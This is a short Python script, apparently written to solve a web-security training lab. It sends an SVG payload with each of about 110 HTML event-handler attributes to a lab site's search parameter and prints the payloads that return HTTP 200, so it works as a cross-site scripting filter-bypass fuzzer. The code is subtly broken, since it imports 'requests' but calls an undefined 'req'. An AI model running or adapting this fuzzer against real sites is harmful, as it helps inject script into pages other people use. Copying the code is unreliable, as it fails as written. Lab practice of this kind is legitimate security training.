import requests

attribute = ["onafterprint","onafterscriptexecute","onanimationcancel","onanimationend","onanimationiteration","onanimationstart","onauxclick","onbeforecopy","onbeforecut","onbeforeinput","onbeforeprint","onbeforescriptexecute","onbeforeunload","onbegin","onblur","onbounce","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontextmenu","oncopy","oncuechange","oncut","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onend","onended","onerror","onfinish","onfocus","onfocusin","onfocusout","onfullscreenchange","onhashchange","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onmessage","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onmozfullscreenchange","onpagehide","onpageshow","onpaste","onpause","onplay","onplaying","onpointerdown","onpointerenter","onpointerleave","onpointermove","onpointerout","onpointerover","onpointerrawupdate","onpointerup","onpopstate","onprogress","onratechange","onrepeat","onreset","onresize","onscroll","onscrollend","onsearch","onseeked","onseeking","onselect","onselectionchange","onselectstart","onshow","onstart","onsubmit","ontimeupdate","ontoggle","ontouchend","ontouchmove","ontouchstart","ontransitioncancel","ontransitionend","ontransitionrun","ontransitionstart","onunhandledrejection","onunload","onvolumechange","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel"]

def bruteTagAttribute(attr):
    payload = f"<svg {attr}=print()></svg>"
    r = req.get(f"https://0a720007048ba6c680930d4c00050009.web-security-academy.net/?search={payload}")
    if(r.status_code == 200):
        print(payload)
    

for attr in attribute:
    bruteTagAttribute(attr)
